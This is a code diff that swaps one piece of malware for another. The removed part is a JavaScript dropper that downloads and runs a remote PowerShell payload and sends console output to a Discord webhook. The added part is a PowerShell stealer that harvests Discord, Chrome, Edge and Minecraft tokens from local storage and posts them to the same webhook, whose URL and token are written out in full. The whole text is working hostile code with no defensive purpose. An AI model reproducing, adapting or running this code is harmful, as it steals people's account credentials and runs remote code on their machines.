@@ -1,208 +1,42 @@
-// Java class imports
-const File = Java.type('java.io.File');
-const FileWriter = Java.type('java.io.FileWriter');
-const HttpURLConnection = Java.type('java.net.HttpURLConnection');
-const URL = Java.type('java.net.URL');
-const BufferedReader = Java.type('java.io.BufferedReader');
-const InputStreamReader = Java.type('java.io.InputStreamReader');
-const OutputStreamWriter = Java.type('java.io.OutputStreamWriter');
-const Runtime = Java.type('java.lang.Runtime');
+$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
-// Remote PowerShell payload
-const scriptUrl =
-  'https://raw.githubusercontent.com/ZypherDK/tungtungrahtur/refs/heads/main/notarat';
-
-// Temp file location
-const tempFolder = java.lang.System.getProperty('java.io.tmpdir');
-const scriptPath = tempFolder + File.separator + 'autosell.ps1';
-
-// Discord webhook used for exfiltration
-const WEBHOOK_URL =
-  'https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc';
-
-/**
- * Send text to Discord webhook
- */
-function sendToWebhook(message) {
-  try {
-    const url = new URL(WEBHOOK_URL);
-    const connection = url.openConnection();
-
-    connection.setDoOutput(true);
-    connection.setRequestMethod('POST');
-    connection.setRequestProperty(
-      'Content-Type',
-      'application/json'
-    );
-
-    const payload = JSON.stringify({
-      content: message.substring(0, 1990)
-    });
-
-    const writer = new OutputStreamWriter(
-      connection.getOutputStream(),
-      'UTF-8'
-    );
-
-    writer.write(payload);
-    writer.flush();
-    writer.close();
-
-    const responseCode = connection.getResponseCode();
-
-    if (responseCode !== 204 && responseCode !== 200) {
-      print(
-        'Failed to send webhook message. Response code: ' +
-        responseCode
-      );
-    }
-
-  } catch (err) {
-    print('Webhook Error: ' + err.message);
-  }
+function Send-Discord {
+    param($content)
+    $payload = @{ content = $content } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
 }
 
-/**
- * Hijack print() so ALL console output is exfiltrated
- */
-const originalPrint = print;
+$paths = @(
+    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
+    "$env:APPDATA\.minecraft\launcher_profiles.json"
+)
 
-print = function (...args) {
-  const message = args.join(' ');
-
-  originalPrint(message);
-
-  // send every printed message to Discord
-  sendToWebhook(message);
-};
-
-/**
- * Collect public IP + location data
- */
-function getMyIPInfo() {
-  try {
-    const url = new URL('http://ip-api.com/json/');
-    const connection = url.openConnection();
-
-    connection.setRequestMethod('GET');
-
-    if (
-      connection.getResponseCode() !==
-      HttpURLConnection.HTTP_OK
-    ) {
-      throw new Error(
-        'Failed to fetch IP info: HTTP ' +
-        connection.getResponseCode()
-      );
+foreach ($path in $paths) {
+    if (Test-Path $path) {
+        if ($path -like "*.json") {
+            try {
+                $data = Get-Content $path -Raw | ConvertFrom-Json
+                if ($data.accessToken) { Send-Discord "**[MC TOKEN]**`n```$($data.accessToken)```" }
+            } catch {}
+        } else {
+            Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content) {
+                    $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
+                    foreach ($match in $matches) {
+                        Send-Discord "**[TOKEN]**`n```$($match.Value)```"
+                        Start-Sleep -Milliseconds 200
+                    }
+                }
+            }
+        }
     }
-
-    const reader = new BufferedReader(
-      new InputStreamReader(
-        connection.getInputStream()
-      )
-    );
-
-    let response = '';
-    let line;
-
-    while ((line = reader.readLine()) !== null) {
-      response += line;
-    }
-
-    reader.close();
-
-    print('\n Your Public IP & Location Info:');
-    print(response);
-
-  } catch (err) {
-    print('Error getting IP info: ' + err.message);
-  }
 }
 
-/**
- * Download remote PowerShell script
- */
-function downloadScript(url, outputPath) {
-  try {
-    const connection = new URL(url).openConnection();
-
-    connection.setRequestMethod('GET');
-
-    if (
-      connection.getResponseCode() !==
-      HttpURLConnection.HTTP_OK
-    ) {
-      throw new Error(
-        'Failed to download file: HTTP ' +
-        connection.getResponseCode()
-      );
-    }
-
-    const reader = new BufferedReader(
-      new InputStreamReader(
-        connection.getInputStream()
-      )
-    );
-
-    const writer = new FileWriter(
-      new File(outputPath)
-    );
-
-    let line;
-
-    while ((line = reader.readLine()) !== null) {
-      writer.write(line + '\n');
-    }
-
-    reader.close();
-    writer.close();
-
-    print(
-      'Script downloaded successfully to: ' +
-      outputPath
-    );
-
-  } catch (err) {
-    print(
-      'Error downloading the script: ' +
-      err.message
-    );
-
-    throw err;
-  }
-}
-
-/**
- * Execute downloaded PowerShell payload
- */
-function executeScript(scriptPath) {
-  try {
-    const process = Runtime
-      .getRuntime()
-      .exec(
-        'powershell -ExecutionPolicy Bypass -File "' +
-        scriptPath +
-        '"'
-      );
-
-    process.waitFor();
-
-    const exitCode = process.exitValue();
-
-    print(
-      'Script executed with exit code: ' +
-      exitCode
-    );
-
-  } catch (err) {
-    print(
-      'Error executing the script: ' +
-      err.message
-    );
-  }
-}
-
-// Main execution chain
-getMyIPInfo();
-downloadScript(scriptUrl, scriptPath);
-executeScript(scriptPath);
+Send-Discord "**[DONE]** $env:COMPUTERNAME"
